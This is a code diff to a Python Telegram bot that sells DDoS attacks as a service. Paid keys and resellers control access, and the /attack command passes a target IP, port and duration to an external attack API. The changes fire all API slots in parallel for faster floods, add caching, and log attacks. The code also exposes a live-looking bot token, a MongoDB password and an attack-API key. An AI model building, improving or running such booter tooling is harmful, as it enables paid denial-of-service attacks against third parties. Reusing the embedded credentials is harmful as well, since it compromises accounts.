@@ -25,12 +25,17 @@ from urllib3.util.retry import Retry
 def create_session():
     session = requests.Session()
     retry = Retry(
-        total=3,
-        backoff_factor=0.5,
+        total=2,
+        backoff_factor=0.3,
         status_forcelist=[429, 500, 502, 503, 504],
         allowed_methods=["GET", "POST"]
     )
-    adapter = HTTPAdapter(max_retries=retry, pool_connections=20, pool_maxsize=20)
+    adapter = HTTPAdapter(
+        max_retries=retry,
+        pool_connections=50,
+        pool_maxsize=50,
+        pool_block=False
+    )
     session.mount("http://", adapter)
     session.mount("https://", adapter)
     session.verify = False
@@ -49,7 +54,7 @@ sys.stderr.reconfigure(line_buffering=True)
 
 BOT_START_TIME = datetime.now()
 
-# ===== CONFIGURATION (Railway ENV Variables) =====
+# ===== CONFIGURATION =====
 BOT_TOKEN = os.getenv("BOT_TOKEN", "8878650472:AAGnDF_e1d0uCpp1QEMOr64DI9dgz9tr6_o")
 MONGO_URL = os.getenv("MONGO_URL", "mongodb+srv://rajvbhai99_db_user:7FSN3iYV695rHGMT@cluster0.bjbjbub.mongodb.net/?appName=Cluster0")
 BOT_OWNER = int(os.getenv("BOT_OWNER", "6539807903"))
@@ -74,14 +79,23 @@ try:
     cmd_media_collection = db['cmd_media']
     apis_collection = db['apis']
 
+    # === Indexes (fast lookups) ===
     try:
         keys_collection.create_index('key', unique=True)
+        keys_collection.create_index('used_by')
+        keys_collection.create_index('is_trail')
     except Exception as e:
         print(f"⚠️ Key index warning: {e}", flush=True)
+
     users_collection.create_index('user_id', unique=True)
+    users_collection.create_index('key_expiry')
+    users_collection.create_index('banned')
+
     resellers_collection.create_index('user_id', unique=True)
     bot_users_collection.create_index('user_id', unique=True)
     cmd_media_collection.create_index('command', unique=True)
+    attack_logs_collection.create_index('user_id')
+    attack_logs_collection.create_index('timestamp')
 
     print("✅ MongoDB connected successfully!", flush=True)
 except Exception as e:
@@ -91,9 +105,9 @@ except Exception as e:
 bot = telebot.TeleBot(BOT_TOKEN)
 
 # ===== KEY PREFIX =====
-KEY_PREFIX = "@DDOS_X_BOT-"
+KEY_PREFIX = "DDOS X BOT-"
 
-# ===== NETHUNTER API - 5 SLOTS =====
+# ===== NETHUNTER API =====
 NETHUNTER_URL = "https://nethunter.primium.site/api/v1/attack/start?key=nk_efe7af3ffde80dfa07dd72fd04415d2010451c4f&ip={ip}&port={port}&time={duration}"
 
 DEFAULT_API_LIST = [
@@ -433,6 +447,14 @@ class DDOSProtection:
 
 protection = DDOSProtection()
 
+# ===== FAST CACHES =====
+_channel_cache = {}   # {user_id: (ts, bool)}
+_CHANNEL_CACHE_TTL = 300
+_key_cache = {}       # {user_id: (ts, bool, expiry_ts)}
+_KEY_CACHE_TTL = 30
+_ban_cache = {}       # {user_id: (ts, bool)}
+_BAN_CACHE_TTL = 60
+
 def check_maintenance(message):
     if is_maintenance() and message.from_user.id != BOT_OWNER:
         bot.reply_to(message, get_maintenance_msg())
@@ -443,17 +465,31 @@ def check_banned(message):
     user_id = message.from_user.id
     if user_id == BOT_OWNER:
         return False
+
+    now_ts = time.time()
+    cached = _ban_cache.get(user_id)
+    if cached and (now_ts - cached[0]) < _BAN_CACHE_TTL:
+        if cached[1]:
+            bot.reply_to(message, "🚫 𝗧𝗨𝗠 𝗕𝗔𝗡 𝗛𝗢!\n\n📞 Contact Your Seller")
+            return True
+        return False
+
     user = users_collection.find_one({'user_id': user_id})
     if user and user.get('banned'):
         if user.get('ban_type') == 'temporary' and user.get('ban_expiry'):
             if datetime.now() > user['ban_expiry']:
                 users_collection.update_one({'user_id': user_id}, {'$set': {'banned': False}, '$unset': {'ban_expiry': "", 'ban_type': ""}})
+                _ban_cache[user_id] = (now_ts, False)
                 return False
             expiry_str = user['ban_expiry'].strftime('%d-%m-%Y %H:%M:%S')
             bot.reply_to(message, f"🚫 𝗧𝗨𝗠 𝗧𝗘𝗠𝗣𝗢𝗥𝗔𝗥𝗬 𝗕𝗔𝗡 𝗛𝗢!\n\n⏳ Expiry: {expiry_str}\n❌ Tum abhi kuch nahi kar sakte.\n\n📞 Contact Your Seller")
+            _ban_cache[user_id] = (now_ts, True)
             return True
         bot.reply_to(message, f"🚫 𝗧𝗨𝗠 𝗣𝗘𝗥𝗠𝗔𝗡𝗘𝗡𝗧 𝗕𝗔𝗡 𝗛𝗢!\n\n❌ Tum kuch nahi kar sakte.\n\n📞 Contact Your Seller")
+        _ban_cache[user_id] = (now_ts, True)
         return True
+
+    _ban_cache[user_id] = (now_ts, False)
     return False
 
 def check_channel_join(message):
@@ -462,6 +498,14 @@ def check_channel_join(message):
     user_id = message.from_user.id
     if user_id == BOT_OWNER or is_reseller(user_id):
         return True
+
+    now_ts = time.time()
+    cached = _channel_cache.get(user_id)
+    if cached and (now_ts - cached[0]) < _CHANNEL_CACHE_TTL:
+        if cached[1]:
+            return True
+        # if cached False, recheck (user might have joined)
+
     not_joined = []
     for channel_username in REQUIRED_CHANNEL_USERNAMES:
         try:
@@ -471,7 +515,9 @@ def check_channel_join(message):
         except Exception as e:
             print(f"⚠️ Channel check error for {channel_username}: {e}")
             not_joined.append(f"@{channel_username}")
+
     if not_joined:
+        _channel_cache[user_id] = (now_ts, False)
         channels_text = "\n".join([f"• {ch}" for ch in not_joined])
         bot.reply_to(message,
             f"❌ 𝗣𝗟𝗘𝗔𝗦𝗘 𝗝𝗢𝗜𝗡 𝗥𝗘𝗤𝗨𝗜𝗥𝗘𝗗 𝗖𝗛𝗔𝗡𝗡𝗘𝗟!\n\n"
@@ -481,6 +527,8 @@ def check_channel_join(message):
             f"📢 Channel: {', '.join(REQUIRED_CHANNEL_USERNAMES)}"
         )
         return False
+
+    _channel_cache[user_id] = (now_ts, True)
     return True
 
 def check_group_approval(message):
@@ -541,14 +589,17 @@ def clear_pending_feedback(user_id):
         del pending_feedback[user_id]
 
 def log_attack(user_id, username, target, port, duration):
-    attack_logs_collection.insert_one({
-        'user_id': user_id,
-        'username': username,
-        'target': target,
-        'port': port,
-        'duration': duration,
-        'timestamp': datetime.now()
-    })
+    try:
+        attack_logs_collection.insert_one({
+            'user_id': user_id,
+            'username': username,
+            'target': target,
+            'port': port,
+            'duration': duration,
+            'timestamp': datetime.now()
+        })
+    except Exception as e:
+        print(f"log_attack error: {e}", flush=True)
 
 def generate_key(length=12):
     chars = string.ascii_uppercase + string.digits
@@ -599,12 +650,20 @@ def resolve_user(input_str):
     return None, None
 
 def has_valid_key(user_id):
+    now_ts = time.time()
+    cached = _key_cache.get(user_id)
+    if cached and (now_ts - cached[0]) < _KEY_CACHE_TTL:
+        return cached[1]
+
     user = users_collection.find_one({'user_id': user_id, 'key': {'$ne': None}})
     if not user or not user.get('key_expiry'):
+        _key_cache[user_id] = (now_ts, False, 0)
         return False
     if datetime.now() > user['key_expiry']:
         users_collection.update_one({'user_id': user_id}, {'$set': {'key': None, 'key_expiry': None}})
+        _key_cache[user_id] = (now_ts, False, 0)
         return False
+    _key_cache[user_id] = (now_ts, True, user['key_expiry'].timestamp())
     return True
 
 def get_time_remaining(user_id):
@@ -742,26 +801,29 @@ def track_bot_user(user_id, username=None, first_name=None):
     except:
         pass
 
-def _call_single_api(slot_index, url, target, port, duration):
+# ===== FAST ASYNC API CALL =====
+def _fire_api_async(api_index, api_url, target, port, duration, result_holder):
     try:
-        print(f"[NetHunter Slot {slot_index+1}] 🚀 Calling: {url}", flush=True)
-        response = HTTP_SESSION.get(url, timeout=20, verify=False)
-        print(f"[NetHunter Slot {slot_index+1}] ✅ Status: {response.status_code} | Response: {response.text[:300]}", flush=True)
+        print(f"[Slot {api_index+1}] 🚀 FIRE: {api_url}", flush=True)
+        response = HTTP_SESSION.get(api_url, timeout=8, verify=False)
+        print(f"[Slot {api_index+1}] ✅ {response.status_code} | {response.text[:150]}", flush=True)
         if response.status_code in [200, 201, 202]:
             try:
-                return response.json().get('success') is True
+                if response.json().get('success') is True:
+                    result_holder['success'] = True
+                    result_holder['resp'] = response.text[:200]
+                    return
             except Exception:
-                return True
-        return False
+                result_holder['success'] = True
+                result_holder['resp'] = response.text[:200]
+                return
+        result_holder['resp'] = response.text[:200]
     except requests.exceptions.Timeout:
-        print(f"[NetHunter Slot {slot_index+1}] ❌ TIMEOUT", flush=True)
-        return False
+        print(f"[Slot {api_index+1}] ❌ TIMEOUT", flush=True)
     except requests.exceptions.ConnectionError as e:
-        print(f"[NetHunter Slot {slot_index+1}] ❌ CONNECTION ERROR: {e}", flush=True)
-        return False
+        print(f"[Slot {api_index+1}] ❌ CONN ERR: {e}", flush=True)
     except Exception as e:
-        print(f"[NetHunter Slot {slot_index+1}] ❌ ERROR: {e}", flush=True)
-        return False
+        print(f"[Slot {api_index+1}] ❌ ERR: {e}", flush=True)
 
 def generate_attack_start_ui(target, port, duration, user_id, username=None):
     username_display = username or str(user_id)
@@ -810,125 +872,88 @@ def generate_global_status_ui():
     footer = "━━━━━━━━━━━━━━━━━━━━"
     return header + body + footer
 
+# ====== FAST ATTACK STARTER ======
 def start_attack(target, port, duration, message, attack_id, api_index, is_group=False):
     try:
         user_id = message.from_user.id
         username = message.from_user.username or message.from_user.first_name or str(user_id)
-        log_attack(user_id, username, target, port, duration)
+
+        # DB log in background
+        threading.Thread(
+            target=log_attack,
+            args=(user_id, username, target, port, duration),
+            daemon=True
+        ).start()
+
         if not is_owner(user_id) and get_feedback_enabled():
             set_pending_feedback(user_id, target, port, duration)
-        cooldown_time = get_group_cooldown() if is_group else get_private_cooldown()
 
-        api_url = API_LIST[api_index].format(ip=target, port=port, duration=duration)
-        api_success = False
-        api_response_text = ""
-
-        try:
-            print(f"[NetHunter Slot {api_index+1}] 🚀 Calling: {api_url}", flush=True)
-            response = HTTP_SESSION.get(api_url, timeout=20, verify=False)
-            print(f"[NetHunter Slot {api_index+1}] ✅ Status: {response.status_code} | Response: {response.text[:300]}", flush=True)
-            api_response_text = response.text[:200]
-
-            if response.status_code in [200, 201, 202]:
-                try:
-                    resp_json = response.json()
-                    if resp_json.get('success') is True:
-                        api_success = True
-                        print(f"[NetHunter Slot {api_index+1}] 🎯 Attack ID: {resp_json.get('attack_id', 'N/A')}", flush=True)
-                    else:
-                        print(f"[NetHunter Slot {api_index+1}] ⚠️ success=false: {resp_json.get('message', '')}", flush=True)
-                except Exception:
-                    api_success = True
-        except requests.exceptions.Timeout:
-            print(f"[NetHunter Slot {api_index+1}] ❌ TIMEOUT", flush=True)
-        except requests.exceptions.ConnectionError as e:
-            print(f"[NetHunter Slot {api_index+1}] ❌ CONNECTION ERROR: {e}", flush=True)
-        except Exception as e:
-            print(f"[NetHunter Slot {api_index+1}] ❌ ERROR: {e}", flush=True)
-
-        if not api_success and len(API_LIST) > 1:
-            for alt_idx in range(len(API_LIST)):
-                if alt_idx == api_index:
-                    continue
-                try:
-                    alt_url = API_LIST[alt_idx].format(ip=target, port=port, duration=duration)
-                    print(f"[NetHunter Slot {alt_idx+1}] 🔄 Fallback: {alt_url}", flush=True)
-                    alt_resp = HTTP_SESSION.get(alt_url, timeout=20, verify=False)
-                    print(f"[NetHunter Slot {alt_idx+1}] ✅ Fallback Status: {alt_resp.status_code}", flush=True)
-                    if alt_resp.status_code in [200, 201, 202]:
-                        try:
-                            alt_json = alt_resp.json()
-                            if alt_json.get('success') is True:
-                                api_success = True
-                                api_response_text = alt_resp.text[:200]
-                                break
-                        except Exception:
-                            api_success = True
-                            api_response_text = alt_resp.text[:200]
-                            break
-                except Exception as e:
-                    print(f"[NetHunter Slot {alt_idx+1}] ❌ Fallback Error: {e}", flush=True)
-
+        # Send start message IMMEDIATELY (before API call)
         attack_start_msg = generate_attack_start_ui(target, port, duration, user_id, username)
-        if not api_success:
-            attack_start_msg = (
-                f"⚠️ <b>API ne response nahi diya!</b>\n"
-                f"Target: <code>{target}:{port}</code>\n\n"
-                f"{attack_start_msg}"
-            )
-
         try:
             if get_reel_enabled():
                 reel_id = get_random_reel()
                 if reel_id:
-                    bot.send_video(
-                        message.chat.id,
-                        reel_id,
-                        caption=attack_start_msg,
-                        supports_streaming=True,
-                        parse_mode="HTML"
-                    )
+                    threading.Thread(
+                        target=bot.send_video,
+                        args=(message.chat.id, reel_id),
+                        kwargs={'caption': attack_start_msg, 'supports_streaming': True, 'parse_mode': "HTML"},
+                        daemon=True
+                    ).start()
                 else:
-                    if is_owner(user_id):
-                        bot.reply_to(message, f"👑 Owner\n{attack_start_msg}", parse_mode="HTML")
-                    else:
-                        bot.reply_to(message, attack_start_msg, parse_mode="HTML")
+                    bot.reply_to(message, attack_start_msg, parse_mode="HTML")
             else:
                 if is_owner(user_id):
                     bot.reply_to(message, f"👑 Owner\n{attack_start_msg}", parse_mode="HTML")
                 else:
                     bot.reply_to(message, attack_start_msg, parse_mode="HTML")
         except Exception as e:
-            print(f"Reel send error: {e}")
-            try:
-                if is_owner(user_id):
-                    bot.reply_to(message, f"👑 Owner\n{attack_start_msg}", parse_mode="HTML")
-                else:
-                    bot.reply_to(message, attack_start_msg, parse_mode="HTML")
-            except:
-                pass
+            print(f"Start msg error: {e}", flush=True)
 
+        # FIRE API IN PARALLEL
+        result_holder = {'success': False, 'resp': ''}
+        threads = []
+        priority_thread = None
+        for idx, url_tpl in enumerate(API_LIST):
+            try:
+                url = url_tpl.format(ip=target, port=port, duration=duration)
+            except Exception:
+                continue
+            t = threading.Thread(
+                target=_fire_api_async,
+                args=(idx, url, target, port, duration, result_holder),
+                daemon=True
+            )
+            t.start()
+            threads.append(t)
+            if idx == api_index:
+                priority_thread = t
+
+        # Wait max 2s on priority slot
+        if priority_thread is not None:
+            priority_thread.join(timeout=2.0)
+
+        # Wait for attack duration
         time.sleep(duration)
 
         with _attack_lock:
-            if attack_id in active_attacks:
-                del active_attacks[attack_id]
-            if api_in_use:
-                api_in_use.pop(attack_id, None)
+            active_attacks.pop(attack_id, None)
+            api_in_use.pop(attack_id, None)
 
         complete_msg = generate_attack_complete_ui(target, port, duration)
-        if is_owner(user_id):
-            bot.reply_to(message, f"👑 Owner Complete\n{complete_msg}", parse_mode="HTML")
-        else:
-            bot.reply_to(message, complete_msg, parse_mode="HTML")
+        try:
+            if is_owner(user_id):
+                bot.reply_to(message, f"👑 Owner Complete\n{complete_msg}", parse_mode="HTML")
+            else:
+                bot.reply_to(message, complete_msg, parse_mode="HTML")
+        except Exception as e:
+            print(f"Complete msg error: {e}", flush=True)
 
     except Exception as e:
         print(f"start_attack error: {e}", flush=True)
         with _attack_lock:
-            if attack_id in active_attacks:
-                del active_attacks[attack_id]
-            if api_in_use:
-                api_in_use.pop(attack_id, None)
+            active_attacks.pop(attack_id, None)
+            api_in_use.pop(attack_id, None)
 
 def _send_cmd_media(chat_id, file_id, file_type, caption=None, reply_to=None):
     try:
@@ -1401,6 +1426,7 @@ def verify_command(message):
         channels_text = "\n".join([f"• {ch}" for ch in not_joined])
         bot.reply_to(message, f"❌ Not joined:\n{channels_text}\n\nJoin then /verify again.")
     else:
+        _channel_cache[user_id] = (time.time(), True)
         bot.reply_to(message, f"✅ Verified!\n📢 Channel: {', '.join(REQUIRED_CHANNEL_USERNAMES)}")
 
 @bot.message_handler(commands=["id"])
@@ -2337,7 +2363,7 @@ def redeem_key_command(message):
     user_name = message.from_user.first_name
     command_parts = message.text.split(maxsplit=1)
     if len(command_parts) != 2:
-        bot.reply_to(message, "⚠️ Usage: /redeem <key>\n\nExample: /redeem @DDOS_X_BOT-A1B2C3D4E5F6")
+        bot.reply_to(message, "⚠️ Usage: /redeem <key>\n\nExample: /redeem DDOS X BOT-A1B2C3D4E5F6")
         return
     key_input = command_parts[1].strip()
     key_doc = keys_collection.find_one({'key': key_input})
@@ -2479,6 +2505,7 @@ def extend_key_command(message):
     else:
         new_expiry = datetime.now() + duration
     users_collection.update_one({'user_id': target_user_id}, {'$set': {'key_expiry': new_expiry}})
+    _key_cache.pop(target_user_id, None)
     new_remaining = format_timedelta(new_expiry - datetime.now())
     try:
         bot.send_message(target_user_id, f"🎉 Time Extended!\n\n⏰ Added: {duration_label}\n⏳ Total Time: {new_remaining}\n\nEnjoy!")
@@ -2515,6 +2542,7 @@ def extend_all_command(message):
         else:
             new_expiry = datetime.now() + duration
         users_collection.update_one({'user_id': uid}, {'$set': {'key_expiry': new_expiry}})
+        _key_cache.pop(uid, None)
         extended_count += 1
         try:
             bot.send_message(uid, f"🎉 Time Extended for ALL Users!\n\n⏰ Added: {duration_label}\n\nEnjoy!")
@@ -2550,6 +2578,7 @@ def down_key_command(message):
         return
     new_expiry = user['key_expiry'] - duration
     display = f"@{resolved_name}" if resolved_name else str(target_user_id)
+    _key_cache.pop(target_user_id, None)
     if new_expiry <= datetime.now():
         users_collection.update_one({'user_id': target_user_id}, {'$set': {'key': None, 'key_expiry': None}})
         bot.reply_to(message, f"⚠️ Key Expired!\n\n👤 User: {display}\n🆔 ID: {target_user_id}\n❌ Key removed!")
@@ -2742,6 +2771,7 @@ def confirm_del_exp_command(message):
     for user in expired_users:
         try:
             users_collection.delete_one({'user_id': user['user_id']})
+            _key_cache.pop(user['user_id'], None)
             deleted_count += 1
         except:
             pass
@@ -2820,6 +2850,7 @@ def feedback_off_command(message):
     set_feedback_enabled(False)
     bot.reply_to(message, "✅ Feedback disabled! Users can attack without sending screenshot.")
 
+# ====== MAIN /ATTACK ======
 @bot.message_handler(commands=["attack"])
 def handle_attack(message):
     if check_maintenance(message): return
@@ -3022,6 +3053,7 @@ def tban_user_command(message):
         return
     ban_expiry = datetime.now() + duration_td
     users_collection.update_one({'user_id': target_user_id}, {'$set': {'banned': True, 'ban_type': 'temporary', 'ban_expiry': ban_expiry}}, upsert=True)
+    _ban_cache.pop(target_user_id, None)
     bot.reply_to(message, f"🚫 User {resolved_name or target_user_id} ko {label} ke liye ban kar diya!\n⏳ Expiry: {ban_expiry.strftime('%d-%m-%Y %H:%M:%S')}")
 
 @bot.message_handler(commands=["ban"])
@@ -3041,6 +3073,7 @@ def ban_user_command(message):
         bot.reply_to(message, "❌ Owner ko ban nahi kar sakte!")
         return
     users_collection.update_one({'user_id': target_user_id}, {'$set': {'user_id': target_user_id, 'username': resolved_name, 'banned': True, 'banned_at': datetime.now()}}, upsert=True)
+    _ban_cache.pop(target_user_id, None)
     try:
         bot.send_message(target_user_id, "🚫 Aapko ban kar diya gaya hai!")
     except:
@@ -3062,6 +3095,7 @@ def unban_user_command(message):
         bot.reply_to(message, "❌ User nahi mila!")
         return
     result = users_collection.update_one({'user_id': target_user_id}, {'$set': {'banned': False}})
+    _ban_cache.pop(target_user_id, None)
     display = f"@{resolved_name}" if resolved_name else str(target_user_id)
     if result.modified_count > 0:
         try:
@@ -3349,7 +3383,7 @@ def ok_command(message):
     set_maintenance(False)
     bot.reply_to(message, "✅ Maintenance OFF!\nBot normal hai.")
 
-# ================== START WITH PROFILE PHOTO ==================
+# ================== START ==================
 @bot.message_handler(commands=['start'])
 def welcome_start(message):
     user_id = message.from_user.id
@@ -3431,7 +3465,6 @@ Use /help to see commands.
             bot.reply_to(message, response)
         except:
             pass
-# ================== END START ==================
 
 @bot.message_handler(content_types=['photo'])
 def handle_feedback_photo(message):
@@ -3506,7 +3539,7 @@ def load_saved_channels():
 load_saved_channels()
 protection.enabled = get_ddos_protection()
 
-# ================== DUMMY WEB SERVER FOR RAILWAY ==================
+# ================== DUMMY WEB SERVER ==================
 def run_dummy_server():
     port = int(os.getenv("PORT", 8080))
     class Handler(http.server.SimpleHTTPRequestHandler):
@@ -3523,6 +3556,16 @@ def run_dummy_server():
             httpd.serve_forever()
     except Exception as e:
         print(f"⚠️ Dummy server error: {e}", flush=True)
+
+# ================== WARMUP ==================
+def _warmup():
+    try:
+        reload_api_list()
+        update_reseller_pricing()
+        load_saved_channels()
+        print("✅ Warmup complete", flush=True)
+    except Exception as e:
+        print(f"Warmup error: {e}", flush=True)
 
 # ================== MAIN ==================
 if __name__ == "__main__":
@@ -3542,9 +3585,12 @@ if __name__ == "__main__":
     print(f"📸 Feedback Feature: {'ON' if get_feedback_enabled() else 'OFF'}")
     print("=" * 50)
 
-    # Start dummy web server (Railway Web Service ke liye)
+    # Start dummy web server for Railway
     server_thread = threading.Thread(target=run_dummy_server, daemon=True)
     server_thread.start()
+
+    # Warmup in background
+    threading.Thread(target=_warmup, daemon=True).start()
 
     time.sleep(2)
 
